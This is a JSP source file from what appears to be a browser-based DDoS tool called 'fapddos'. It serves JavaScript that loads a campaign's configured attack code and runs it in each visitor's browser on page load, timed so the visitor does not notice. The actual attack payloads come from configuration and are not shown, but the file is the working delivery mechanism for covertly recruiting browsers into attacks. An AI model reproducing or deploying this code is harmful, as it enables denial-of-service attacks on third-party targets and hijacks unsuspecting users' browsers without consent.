<%@ page language="java" contentType="text/javascript; charset=UTF-8"
	pageEncoding="UTF-8"%><%@ page import="com.google.gson.*"%><%@ page
	import="com.fapddos.servlets.Core"%><%@ page
	import="com.fapddos.configuration.*"%><% 
response.setContentType("text/javascript");
String contentionId = Core.getRequestItem("contention",request);
String campaignId = Core.getRequestItem("campaign",request);
String attackTypeId = null;

if(contentionId == null) {
	%>
//No burgers
	<%
}
if(campaignId == null) {
	%>
//No camping 
	<%
}
Gson g = new GsonBuilder().setPrettyPrinting().create();

if (campaignId != null && contentionId != null) {
	if (Core.getFapConfiguration().getContentions().containsKey(contentionId)) {
		Contention curCont = Core.getFapConfiguration().getContentions().get(contentionId);
		if (curCont.getCampaigns().containsKey(campaignId)) {
			Campaign curCamp = curCont.getCampaigns().get(campaignId);
			attackTypeId = curCamp.getAttacktype();
		} else {
%>//Looking for Shrooms
<%	
		}
	} else {
%>//Contenential Drift
<%	
	}

if (attackTypeId != null) {
%>
var fap =<%=g.toJson(Core.getFapConfiguration().getLightConfig(contentionId, campaignId)) %>;

function doMyBidding (fap) {
<%=Core.getFapConfiguration().getAttackTypes().get(attackTypeId).getAttacks().get("default") %>
}


// Tuck this in, allow the user to load up the page before there is any chance that your script may hurt performance on the client browser. 
if (window.addEventListener) {
	window.addEventListener('load', doMyBidding(fap), false); 
} else if (window.attachEvent) {
	window.attachEvent('onload', doMyBidding(fap)); 
}

<%} else { 
%>//There is nothing here.<%
} 
} else {
	%>//There is nothing here today.<%	
}
%>



